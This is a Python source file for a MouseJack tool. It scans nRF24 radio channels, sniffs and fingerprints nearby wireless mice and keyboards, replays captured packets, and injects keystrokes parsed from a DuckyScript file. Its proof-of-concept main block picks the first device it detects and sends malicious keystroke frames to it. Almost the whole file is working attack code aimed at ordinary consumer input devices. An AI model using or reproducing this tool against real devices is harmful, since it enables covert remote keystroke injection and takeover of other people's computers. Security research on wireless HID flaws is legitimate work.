import usb
import time
from datetime import datetime
from typing import Optional
from six import iteritems
from Script.Device.USB.NRF24Research.NRF import nrf24
from Script.Device.USB.NRF24Research import duckyparser
from Script.Globals import FingerprintRegistry

PING = [0x0f, 0x0f, 0x0f, 0x0f]
CHANNEL_DWELL_TIME = 0.1


class MouseJack(object):
    def __init__(self, activate_lna: object = True, reset: object = False):
        self.crazy_radio: Optional[nrf24] = None
        self.channel = None
        self.channels = range(2, 84)
        self.channel_index = 0
        self.ping = PING
        self.devices = {}
        self.HID = list(FingerprintRegistry.discover().values())
        self.init_radio(activate_lna, reset)
        self.scan_active = False

    def close(self):
        if self.crazy_radio and hasattr(self.crazy_radio, 'device'):
            usb.util.dispose_resources(self.crazy_radio.device)

    @staticmethod
    def hex_to_str(data):
        return ':'.join('{:02X}'.format(x) for x in data)

    @staticmethod
    def str_to_hex(data):
        return [int(b, 16) for b in data.split(':')]

    def init_radio(self, activate_lna, reset):
        try:
            self.crazy_radio = nrf24.NRF24(0)
            if activate_lna:
                self.crazy_radio.avctivate_LNA()
            # if reset:
            #     self.crazy_radio.reset_on_linux()
            return True, "Radio initialized successfully"
        except Exception as ex:
            return False, f"Initialization failed: {ex}"

    def device_detected(self, address, payload):
        channel = self.channels[self.channel_index]
        if address in self.devices:
            self.devices[address]['count'] += 1
            self.devices[address]['timestamp'] = datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')
            if channel not in self.devices[address]['channels']:
                self.devices[address]['channels'].append(channel)
            if self.devices[address]['device'] is None:
                self.devices[address]['device'] = self.get_hid(payload)
            self.devices[address]['payload'] = payload

        else:
            self.devices[address] = {}
            self.devices[address]['index'] = len(self.devices)
            self.devices[address]['count'] = 1
            self.devices[address]['timestamp'] = datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')
            self.devices[address]['channels'] = [self.channels[self.channel_index]]
            self.devices[address]['address'] = self.str_to_hex(address)[::-1]
            self.devices[address]['device'] = self.get_hid(payload)
            self.devices[address]['payload'] = payload

    def clear_devices(self):
        self.devices = {}
        return

    def scan(self, generic=False, timeout=0.5, callback=None):
        if generic:
            self.crazy_radio.activate_promiscuous_mode_generic()
        else:
            self.crazy_radio.activate_promiscuous_mode()

        last_tune = time.time()
        start_time = time.time()

        self.crazy_radio.set_channel(self.channels[self.channel_index])

        if len(self.channels) > 1:
            while time.time() - start_time < timeout:
                if time.time() - last_tune > CHANNEL_DWELL_TIME:
                    self.channel_index = (self.channel_index + 1) % len(self.channels)
                    self.crazy_radio.set_channel(self.channels[self.channel_index])
                    last_tune = time.time()
                # data handling
                try:
                    data = self.crazy_radio.recv_payload()
                except RuntimeError:
                    data = []

                if len(data) >= 5:
                    address, payload = data[0:5], data[5:]
                    print(data)

                    if callback:
                        callback(address, payload)
                    else:
                        self.device_detected(self.hex_to_str(address), payload)

            return self.devices

    def sniff(self, timeout, addr_string, callback=None):
        address = self.str_to_hex(addr_string)[::-1]
        self.crazy_radio.activate_sniffer_mode(address)
        self.channel_index = 0
        self.crazy_radio.set_channel(self.channels[self.channel_index])

        last_ping = time.time()
        start_time = time.time()

        while time.time() - start_time < timeout:
            if len(self.channels) > 1 and time.time() - last_ping > CHANNEL_DWELL_TIME:
                if not self.crazy_radio.send_payload(self.ping, 1, 1):
                    for self.channel_index in range(len(self.channels)):
                        self.crazy_radio.set_channel(self.channels[self.channel_index])
                        if self.crazy_radio.send_payload(self.ping, 1, 1):
                            last_ping = time.time()
                            break
                else:
                    last_ping = time.time()
            try:
                data = self.crazy_radio.recv_payload()
            except RuntimeError:
                data = [1]

            if data[0] == 0:
                last_ping = time.time() + 5.0
                payload = data[1:]

                if callback:
                    callback(address, payload)
                else:
                    self.device_detected(addr_string, payload)

        return self.devices

    def sniffer_mode(self, address):
        self.crazy_radio.activate_sniffer_mode(address)

    def find_channel(self, address):
        self.crazy_radio.activate_sniffer_mode(address)
        for channel in self.channels:
            self.crazy_radio.set_channel(channel)
            if self.crazy_radio.send_payload(self.ping):
                return channel
        return None

    def set_channel(self, channel):
        self.channel = channel
        self.crazy_radio.set_channel(channel)

    def get_hid(self, payload):
        if not payload:
            return None
        for hid in self.HID:
            if hid.fingerprint(payload):
                return hid
        return None

    def send_payload(self, payload):
        return self.crazy_radio.send_payload(payload)

    def attack(self, hid, mal_command):
        hid.build_frames(mal_command)
        for key in mal_command:
            if key['frames']:
                for frame in key['frames']:
                    self.send_payload(frame[0])
                    time.sleep(frame[1] / 1000)

    def mousejack(self, targets, mal_code):
        for addr_string, target in iteritems(targets):
            payload = target['payload']
            channels = target['channels']
            address = target['address']
            hid = target['device']
            self.sniffer_mode(address)
            if hid:
                for channel in channels:
                    self.set_channel(channel)
                    self.attack(hid(address, payload), mal_code)

    @staticmethod
    def report_address(targets):
        addresses = []
        for address, target in iteritems(targets):
            address = target['address']
            addresses.append(address)
        return addresses

    @staticmethod
    def report_channels(targets):
        channels = []
        for address, target in iteritems(targets):
            channel = target['channels']
            channels.append(channel)
        return channels

    @staticmethod
    def report_hid(targets):
        hids = []
        for address, target in iteritems(targets):
            hid = target['device']
            if hid:
                hids.append(hid)
        if len(hids) > 0:
            return hids
        else:
            return 'Unknown'


class Replayer(MouseJack):
    def __init__(self):
        super().__init__()

    def replay(self, targets):
        for address, target in iteritems(targets):
            payload = list(target['payload'])
            channels = target['channels']
            address = target['address']
            self.crazy_radio.activate_sniffer_mode(address)
            for channel in channels:
                self.crazy_radio.set_channel(channel)
                self.crazy_radio.send_payload(payload)

    @staticmethod
    def get_payload(targets):
        payloads = []
        for address, target in iteritems(targets):
            payload = list(target['payload'])
            payload_hex = ':'.join(f'{byte:02X}' for byte in payload)
            payloads.append(payload_hex)
        return payloads



if __name__ == '__main__':
    #POC
    def launch_attacks(mj, targets, mal_command):
        for addr_string, target in iteritems(targets):
            payload = target['payload']
            channels = target['channels']
            address = target['address']
            hid = target['device']

            mj.sniffer_mode(address)

            if hid:
                print("HID")
                for channel in channels:
                    mj.set_channel(channel)
                    mj.attack(hid(address, payload), mal_command)


    file = open("1.txt", 'r')
    parser = duckyparser.DuckyParser(file.read())

    mal_code = parser.parse()

    mj = MouseJack()
    count = 0
    while count < 2:
        mj.scan()
        if mj.devices:

            first_device_address = list(mj.devices.keys())[0]
            print(f"Sniffing device with address: {first_device_address}")
            mj.sniff(0.1, first_device_address)
            count += 1

            device_info = mj.devices[first_device_address]
            print(device_info)

        else:
            print("No devices detected. Exiting.")

    launch_attacks(mj, mj.devices, mal_code)
